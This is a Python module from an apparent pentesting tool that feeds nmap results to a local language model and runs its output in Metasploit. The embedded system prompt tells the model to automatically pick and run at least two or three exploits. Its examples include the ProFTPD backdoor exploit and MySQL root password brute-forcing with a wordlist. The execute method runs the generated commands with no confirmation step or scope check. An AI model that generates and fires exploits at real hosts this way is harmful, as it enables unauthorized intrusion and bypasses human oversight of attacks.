#!/usr/bin/env python3
"""
Metasploit Framework Tool
Integrates msfconsole for exploitation and vulnerability assessment
"""

import re
import subprocess
import tempfile
import os
from typing import Dict, Optional
from rich.console import Console
from rich.panel import Panel
from rich.syntax import Syntax
from .base_tool import BaseTool

console = Console()

class MetasploitTool(BaseTool):
    """Metasploit Framework integration for finding and running exploits"""
    
    def __init__(self):
        super().__init__(name="Metasploit Framework", command="msfconsole")
        self.description = "Find and run exploits using Metasploit Framework"
    
    def check_installed(self) -> bool:
        """Check if msfconsole is installed"""
        result = self.run_command("which msfconsole")
        if result['success']:
            # Get version
            version_result = self.run_command("msfconsole --version")
            if version_result['success']:
                version_line = version_result['stdout'].strip().split('\n')[0]
                console.print(f"✓ {version_line} detected", style="green")
            return True
        return False
    
    def generate_command(self, user_request: str, scan_context: Optional[Dict] = None) -> str:
        """
        Generate Metasploit commands based on user request and previous scan data
        
        Args:
            user_request: What the user wants to do
            scan_context: Previous scan results (nmap data, target info, etc.)
        """
        # Get AI to generate the msfconsole commands
        prompt = self.get_ai_prompt(user_request, scan_context)
        
        try:
            import ollama
            response = ollama.chat(model='dolphin-llama3:8b', messages=[
                {
                    'role': 'system',
                    'content': prompt
                },
                {
                    'role': 'user',
                    'content': user_request
                }
            ])
            
            ai_response = response['message']['content']
            
            # Debug: Show AI response
            if not ai_response or len(ai_response.strip()) < 10:
                console.print(f"[yellow]Warning: AI returned empty or very short response[/yellow]")
                console.print(f"[dim]Response: {ai_response}[/dim]")
            
            # Extract commands from AI response
            commands = self.extract_commands(ai_response)
            
            if commands:
                console.print(f"\n[cyan]Generated Metasploit commands:[/cyan]")
                for cmd in commands:
                    console.print(f"  • {cmd}", style="yellow")
                return commands
            else:
                console.print("[red]Could not generate valid Metasploit commands[/red]")
                return []
                
        except Exception as e:
            console.print(f"[red]Error generating command: {e}[/red]")
            return []
    
    def get_ai_prompt(self, user_request: str, scan_context: Optional[Dict] = None) -> str:
        """Create AI prompt with scan context"""
        
        context_info = ""
        if scan_context:
            context_info = "\n\n=== PREVIOUS SCAN DATA ===\n"
            
            if 'target' in scan_context:
                context_info += f"Target: {scan_context['target']}\n"
            
            if 'ip' in scan_context:
                context_info += f"IP Address: {scan_context['ip']}\n"
            
            if 'open_ports' in scan_context and scan_context['open_ports']:
                context_info += f"\nOpen Ports Found:\n"
                for port in scan_context['open_ports']:
                    context_info += f"  - Port {port.get('port', 'unknown')}: "
                    context_info += f"{port.get('service', 'unknown')} "
                    context_info += f"({port.get('version', 'no version detected')})\n"
            
            if 'os' in scan_context:
                context_info += f"\nOperating System: {scan_context['os']}\n"
            
            context_info += "\n=== END SCAN DATA ===\n"
        
        prompt = f"""You are a Metasploit penetration testing expert performing authorized security testing.

{context_info}

YOUR MISSION: Automatically exploit vulnerabilities found in the scan data above.

CRITICAL RULES:
1. AUTOMATICALLY select and configure exploits for vulnerable services
2. Use the scan data to target specific services/versions
3. For EACH vulnerable service, generate a COMPLETE exploit attempt
4. Include ALL necessary configuration (RHOSTS, RPORT, LHOST, LPORT, payload)
5. Use 'check' command first to verify if target is vulnerable
6. Then use 'exploit' or 'run' command to attempt exploitation
7. Format as actual executable msfconsole commands, one per line

EXPLOITATION STRATEGY:
- For FTP (ProFTPD, vsftpd, etc.): Search version-specific exploits
- For SSH: Try auxiliary/scanner modules, check for weak auth
- For HTTP/Apache: Check for path traversal, RCE vulnerabilities
- For MySQL: Try authentication bypass, SQL injection modules
- For SMTP/Mail services: Check for command injection
- For any service: ALWAYS configure and RUN the exploit, don't just search

COMMAND STRUCTURE FOR EACH EXPLOIT ATTEMPT:
search <service> <version>
use <exploit/path/to/module>
set RHOSTS <target_ip_or_hostname>
set RPORT <port_number>
set LHOST <your_ip>
set LPORT 4444
check
exploit

EXAMPLE (if ProFTPD detected on port 21):
search proftpd
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS {scan_context.get('target', 'TARGET') if scan_context else 'TARGET'}
set RPORT 21
set LHOST tun0
check
exploit

EXAMPLE (if MySQL detected on port 3306):
use auxiliary/scanner/mysql/mysql_login
set RHOSTS {scan_context.get('target', 'TARGET') if scan_context else 'TARGET'}
set RPORT 3306
set USERNAME root
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
run

OUTPUT ONLY EXECUTABLE COMMANDS - NO EXPLANATIONS, NO MARKDOWN, NO COMMENTS.
Generate commands for AT LEAST 2-3 different exploits based on the scan data."""

        return prompt
    
    def extract_commands(self, ai_response: str) -> list:
        """Extract msfconsole commands from AI response"""
        commands = []
        
        # Look for code blocks first
        code_block_pattern = r'```(?:bash|shell|console|msfconsole)?\n(.*?)```'
        matches = re.findall(code_block_pattern, ai_response, re.DOTALL)
        
        if matches:
            for block in matches:
                lines = block.strip().split('\n')
                for line in lines:
                    line = line.strip()
                    if line and not line.startswith('#') and not line.startswith('//'):
                        commands.append(line)
        
        # If no code blocks, try extracting line by line
        if not commands:
            lines = ai_response.split('\n')
            msf_commands = ['search', 'use', 'set', 'show', 'info', 'run', 'exploit', 
                          'check', 'options', 'sessions', 'back', 'exit']
            
            for line in lines:
                line = line.strip()
                # Remove common prefixes like "- ", "* ", "1. ", etc.
                line = re.sub(r'^[-*•]\s*', '', line)
                line = re.sub(r'^\d+\.\s*', '', line)
                
                if any(line.startswith(cmd + ' ') or line == cmd for cmd in msf_commands):
                    commands.append(line)
        
        # Debug output
        if not commands:
            console.print(f"[yellow]Debug: Could not extract commands from AI response[/yellow]")
            console.print(f"[dim]AI Response preview: {ai_response[:300]}...[/dim]")
        
        return commands
    
    def execute(self, commands: list, use_sudo: bool = False) -> Dict:
        """
        Execute Metasploit commands
        
        Args:
            commands: List of msfconsole commands to execute
            use_sudo: Whether to use sudo (usually not needed for msfconsole)
        """
        if not commands:
            return {
                'success': False,
                'output': 'No commands to execute',
                'error': 'Empty command list'
            }
        
        console.print(f"\n[cyan]Executing Metasploit commands...[/cyan]")
        
        # Create a resource file with all commands
        with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as rc_file:
            rc_file.write("# Nighthawk Metasploit Resource Script\n")
            for cmd in commands:
                rc_file.write(f"{cmd}\n")
            rc_file.write("exit\n")  # Exit after commands
            rc_filename = rc_file.name
        
        try:
            # Run msfconsole with resource file
            full_command = f"msfconsole -q -r {rc_filename}"
            
            console.print(f"\n[yellow]Running: {full_command}[/yellow]")
            
            result = self.run_command(full_command, timeout=300)  # 5 minute timeout
            
            # Clean up resource file
            os.unlink(rc_filename)
            
            return result
            
        except Exception as e:
            # Clean up on error
            if os.path.exists(rc_filename):
                os.unlink(rc_filename)
            
            return {
                'success': False,
                'output': '',
                'error': str(e)
            }
    
    def format_output(self, result: Dict, commands: list) -> None:
        """Format and display Metasploit output"""
        if result['success']:
            console.print("\n[green]Metasploit Results:[/green]")
            
            # Display commands executed
            console.print(Panel(
                "\n".join(commands),
                title="[cyan]Commands Executed[/cyan]",
                border_style="cyan"
            ))
            
            # Display output
            output = result['stdout']
            
            # Highlight important sections
            if output:
                # Color code different sections
                output_lines = output.split('\n')
                formatted_lines = []
                
                for line in output_lines:
                    if 'exploit' in line.lower() or 'vulnerable' in line.lower():
                        formatted_lines.append(f"[red]{line}[/red]")
                    elif 'success' in line.lower():
                        formatted_lines.append(f"[green]{line}[/green]")
                    elif 'error' in line.lower() or 'fail' in line.lower():
                        formatted_lines.append(f"[yellow]{line}[/yellow]")
                    else:
                        formatted_lines.append(line)
                
                console.print(Panel(
                    "\n".join(formatted_lines),
                    title="[green]Metasploit Output[/green]",
                    border_style="green"
                ))
            
            # Extract and highlight found exploits
            exploit_pattern = r'exploit/[a-z0-9_/]+'
            exploits = re.findall(exploit_pattern, output)
            if exploits:
                console.print("\n[yellow]Found Exploits:[/yellow]")
                for exploit in set(exploits):
                    console.print(f"  • {exploit}", style="red bold")
        else:
            console.print(f"\n[red]Metasploit execution failed:[/red]")
            console.print(result.get('error', 'Unknown error'))

    def parse_scan_data(self, raw_output: str) -> Dict:
        """
        Parse nmap output to extract useful data for Metasploit
        This helps the AI understand what to target
        """
        scan_data = {
            'open_ports': [],
            'services': [],
            'os': None
        }
        
        # Extract open ports and services
        port_pattern = r'(\d+)/tcp\s+open\s+(\S+)\s*(.*)?'
        matches = re.findall(port_pattern, raw_output)
        
        for match in matches:
            port_info = {
                'port': match[0],
                'service': match[1],
                'version': match[2].strip() if len(match) > 2 else ''
            }
            scan_data['open_ports'].append(port_info)
            scan_data['services'].append(match[1])
        
        # Extract OS information
        os_pattern = r'OS details?: (.+)'
        os_match = re.search(os_pattern, raw_output)
        if os_match:
            scan_data['os'] = os_match.group(1).strip()
        
        # Extract IP address
        ip_pattern = r'Nmap scan report for .*?\(([0-9.]+)\)'
        ip_match = re.search(ip_pattern, raw_output)
        if ip_match:
            scan_data['ip'] = ip_match.group(1)
        
        return scan_data
